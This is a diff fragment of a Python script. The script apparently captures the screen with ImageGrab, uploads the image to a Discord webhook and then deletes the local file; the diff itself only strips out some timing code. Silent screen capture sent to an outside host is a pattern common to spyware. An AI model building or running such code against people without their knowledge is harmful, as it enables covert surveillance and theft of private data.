@@ -1,6 +1,5 @@
 import discord_webhook, os, time
 from PIL import ImageGrab
-start = time.time()
 try:
     os.remove("Screenshot.png")
 except:
@@ -22,6 +21,4 @@ with open("Screenshot.png", "rb") as f:
 
 response = webhook.execute()
 os.remove("Screenshot.png")
-end = time.time()
-total = start - end
-print(total)
+
